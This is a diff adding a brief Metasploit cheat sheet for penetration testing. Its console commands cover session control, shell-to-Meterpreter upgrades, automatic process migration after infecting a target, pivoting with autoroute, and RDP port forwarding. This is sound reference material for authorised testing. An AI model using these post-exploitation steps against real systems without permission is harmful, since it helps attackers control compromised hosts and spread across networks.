@@ -1,0 +1,42 @@
+# execute before start of msfconsole
+msf> systemctl start postgresql
+
+# initiate db
+msf> msfdb init
+
+# check status
+msf> db_status
+
+# list windows 2008 server
+msf> hosts -u -S 2008
+
+# show services of specific host
+msf> services <rhost>
+
+# set rhosts for specific open port
+msf> services -R -u -p <rport>
+
+# execute command on all sessions
+msf> sessions -c ipconfig
+
+# upgrade a shell session
+msf> use post/multi/manage/shell_to_meterpreter
+
+# shortcut for choosing correct handler inside the context of payload module
+msf> to_handler
+
+# automigrate to another process, directly after infecting target
+msf> set AutoRunScript post/windows/manage/migrate
+
+# add route for pivoting via meterpreter
+msf> sessions -i <n>
+msf> autoroute -s 
+msf> run
+
+# connect RDP via meterpreter pivot
+mtr> portfwd add -l <localPort> -p <rport> -r <rhost>
+rdesktop <rhost:rhost>
+
+# tunnel traffic trough proxy
+set PROXIES HTTP:127.0.0.1:8080
+
